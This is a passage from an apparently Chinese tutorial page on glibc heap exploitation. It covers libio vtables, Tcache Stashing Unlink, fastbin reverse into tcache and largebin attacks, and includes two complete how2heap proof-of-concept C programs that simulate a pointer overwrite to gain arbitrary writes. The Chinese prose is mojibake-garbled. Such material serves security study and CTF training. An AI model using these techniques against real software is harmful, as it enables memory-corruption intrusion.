class="comment">//å‡½æ•°äºŒ</span></span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="IO-cookie-jumps"><a href="#IO-cookie-jumps" class="headerlink" title="_IO_cookie_jumps"></a>_IO_cookie_jumps</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_cookie_jumps</span> <span class="title">libio_vtable</span> =</span> &#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_cookie_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_cookie_read),</span><br><span class="line">  JUMP_INIT(write, _IO_cookie_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_cookie_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_cookie_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="Tcache-Stashing-Unlink-Attack"><a href="#Tcache-Stashing-Unlink-Attack" class="headerlink" title="Tcache Stashing Unlink Attack"></a>Tcache Stashing Unlink Attack</h3><ul><li>åˆ©ç”¨æµç¨‹<br>1ã€å‡è®¾ç›®å‰<code>tcache bin</code>ä¸­å·²ç»æœ‰äº”ä¸ªå †å—ï¼Œå¹¶ä¸”ç›¸åº”å¤§å°çš„<code>small bin</code>ä¸­å·²ç»æœ‰ä¸¤ä¸ªå †å—ï¼Œç”±<code>bk</code>æŒ‡é’ˆè¿æ¥ä¸ºï¼š<code>chunk_A&lt;-chunk_B</code><br>2ã€åˆ©ç”¨æ¼æ´ä¿®æ”¹<code>chunk_A</code>çš„<code>bk</code>ä¸º<code>fake chunk</code>ï¼Œå¹¶ä¸”ä¿®æ”¹<code>fake chunk</code>çš„<code>bk</code>ä¸º<code>target_addr - 0x10</code><br>3ã€é€šè¿‡<code>calloc()</code>è¶Šè¿‡<code>tcache bin</code>ï¼Œç›´æ¥ä»<code>small bin</code>ä¸­å–å‡º<code>chunk_B</code>è¿”å›ç»™ç”¨æˆ·ï¼Œå¹¶ä¸”ä¼šå°†<code>chunk_A</code>ä»¥åŠå…¶æ‰€æŒ‡å‘çš„<code>fake chunk</code>æ”¾å…¥<code>tcache bin</code>ï¼ˆè¿™é‡Œåªä¼šæ£€æµ‹<code>chunk_A</code>çš„<code>fd</code>æŒ‡é’ˆæ˜¯å¦æŒ‡å‘äº†<code>chunk_B</code>ï¼‰<br>4ã€åœ¨<code>fake chunk</code>æ”¾å…¥<code>tcache bin</code>ä¹‹å‰ï¼Œæ‰§è¡Œäº†<code>bck-&gt;fd = bin;</code>çš„æ“ä½œï¼ˆè¿™é‡Œçš„<code>bck</code>å°±æ˜¯<code>fake chunk</code>çš„<code>bk</code>ï¼Œä¹Ÿå°±æ˜¯<code>target_addr - 0x10</code>ï¼‰ï¼Œæ•…<code>target_addr - 0x10</code>çš„<code>fd</code>ï¼Œä¹Ÿå°±<code>target_addr</code>åœ°å€ä¼šè¢«å†™å…¥ä¸€ä¸ªä¸<code>libc</code>ç›¸å…³å¤§æ•°å€¼ï¼ˆå¯åˆ©ç”¨ï¼‰<br>5ã€å†ç”³è¯·ä¸€æ¬¡ï¼Œå°±å¯ä»¥ä»<code>tcache</code>ä¸­è·å¾—<code>fake chunk</code>çš„æ§åˆ¶æƒ</li></ul><h4 id="poc-how2heap"><a href="#poc-how2heap" class="headerlink" title="poc(how2heap):"></a>poc(how2heap):</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glibc 2.36</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin reverse into tcache"></a>fastbin reverse into tcache</h3><ul><li>åˆ©ç”¨æµç¨‹:<br>1ã€ç”³è¯·<code>14</code>ä¸ª<code>fastbin</code>èŒƒå›´å†…çš„<code>chunk</code>ï¼Œç„¶åé‡Šæ”¾<code>7</code>ä¸ªç”¨æ¥å¡«æ»¡<code>tcache</code>ï¼Œç„¶åå°†å‰©ä¸‹çš„ä¸ƒä¸ªé‡Šæ”¾è¿›<code>fastbin</code>ä¸­<br>2ã€ä¿®æ”¹ç¬¬ä¸€ä¸ªæ”¾è¿›<code>fastbin</code>çš„<code>chunk</code>çš„<code>fd</code>ä¸º<code>&amp;target</code><br>3ã€é€šè¿‡ç”³è¯·<code>7</code>ä¸ª<code>chunk</code>å°†<code>tcache</code>æ¸…ç©º<br>4ã€ç”³è¯·ä¸€ä¸ª<code>chunk</code>,æ­¤æ—¶ç”±äº<code>tcache</code>ä¸­å·²ç»æ²¡æœ‰<code>chunk</code>äº†ï¼Œæ‰€ä»¥ä¼šå»<code>fastbin</code>é‡Œæ‹¿ï¼Œç„¶åå°†<code>fastbin</code>ä¸­å‰©ä½™çš„<code>chunk</code>è½¬åˆ°<code>tcache</code>ä¸­ï¼Œ<code>fastbin</code>ä¸­æœ‰<code>7</code>ä¸ªï¼Œåˆ†é…ä¸€ä¸ªï¼Œå‰©ä¸‹å…­ä¸ªï¼Œä¾æ¬¡æ”¾è¿›<code>tcache</code>ä¸­ï¼Œè€Œæœ€å…ˆæ”¾å…¥<code>fastbin</code>ä¸­çš„<code>chunk</code>çš„<code>fd</code>è¢«æˆ‘ä»¬æ”¹æˆäº†<code>&amp;target</code>ï¼Œæ‰€ä»¥<code>tcache</code>ä¼šå°†<code>target</code>ä¹Ÿå½“åšä¸€ä¸ª<code>chunk</code>æ”¾è¿›<code>tcache</code>ä¸­<br>5ã€æ­¤æ—¶<code>tcache</code>ä¸­æœ‰<code>7</code>ä¸ª<code>chunk</code>ï¼Œæœ€åä¸€ä¸ª<code>chunk</code>å³ä¸º<code>target</code></li></ul><h4 id="poc-how2heap-1"><a href="#poc-how2heap-1" class="headerlink" title="poc(how2heap):"></a>poc(how2heap):</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glibc 2.36</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">   <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">   <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">   <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">   <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,\n&quot;</span></span><br><span class="line">   <span class="string">&quot;An heap address leak is needed to perform this attack.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;The same patch also ensures the chunk returned by tcache is properly aligned.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line"><span class="type">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fill the tcache.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">   <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">   <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>, victim);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">   <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">   <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">   <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">   <span class="string">&quot;a single free is sufficient.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fill the fastbin.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line"><span class="type">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line"><span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The stack address that we intend to target: %p\n&quot;</span></span><br><span class="line">   <span class="string">&quot;It&#x27;s current value is %p\n&quot;</span>, &amp;stack_var[<span class="number">2</span>], (<span class="type">char</span>*)stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we use a vulnerability such as a buffer overflow or a use-after-free\n&quot;</span></span><br><span class="line"><span class="string">&quot;to overwrite the next pointer at address %p\n\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line"><span class="comment">// The following operation assumes the address of victim is known, thus requiring</span></span><br><span class="line"><span class="comment">// a heap leak.</span></span><br><span class="line">*(<span class="type">size_t</span>**)victim = (<span class="type">size_t</span>*)((<span class="type">long</span>)&amp;stack_var[<span class="number">0</span>] ^ ((<span class="type">long</span>)victim &gt;&gt; <span class="number">12</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Empty tcache.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line"><span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">   <span class="string">&quot;The next allocation triggers the stack to be overwritten. The tcache\n&quot;</span></span><br><span class="line">   <span class="string">&quot;is empty, but the fastbin isn&#x27;t, so the next allocation comes from the\n&quot;</span></span><br><span class="line">   <span class="string">&quot;fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;Those 7 chunks are copied in reverse order into the tcache, so the stack\n&quot;</span></span><br><span class="line">   <span class="string">&quot;address that we are targeting ends up being the first chunk in the tcache.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;It contains a pointer to the next chunk in the list, which is why a heap\n&quot;</span></span><br><span class="line">   <span class="string">&quot;pointer is written to the stack.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;\n&quot;</span></span><br><span class="line">   <span class="string">&quot;Earlier we said that the attack will also work if we free fewer than 6\n&quot;</span></span><br><span class="line">   <span class="string">&quot;extra pointers to the fastbin, but only if the value on the stack is zero.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;That&#x27;s because the value on the stack is treated as a next pointer in the\n&quot;</span></span><br><span class="line">   <span class="string">&quot;linked list and it will trigger a crash if it isn&#x27;t a valid pointer or null.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;\n&quot;</span></span><br><span class="line">   <span class="string">&quot;The contents of our array on the stack now look like this:\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>, q);</span><br><span class="line"></span><br><span class="line">assert(q == (<span class="type">char</span> *)&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h3><ul><li>åˆ©ç”¨æµç¨‹:<br>1ã€åœ¨<code>largebin list</code>ä¸­æ”¾å…¥ä¸€ä¸ªå †å—<code>A</code>ï¼Œå¹¶åˆ©ç”¨<code>UAF</code>ç­‰æ¼æ´åœ¨<code>bk_nextsize</code>å†™å…¥<code>target_addr - 0x20</code><br>2ã€é‡Šæ”¾ä¸€ä¸ªå¤§å°ç•¥å°äºå †å—<code>A</code>çš„å †å—<code>B</code>è¿›å…¥åˆ°åŒä¸€ä¸ª<code>largebin list</code>ï¼Œæ­¤æ—¶å°±ä¼šåœ¨<code>target_addr</code>ä¸­å†™å…¥å †å—Bçš„åœ°å€</li></ul><h3 id="åˆ©ç”¨-IO-2-1-stdout-æ³„éœ²åœ°å€"><a href="#åˆ©ç”¨-IO-2-1-stdout-æ³„éœ²åœ°å€" class="headerlink" 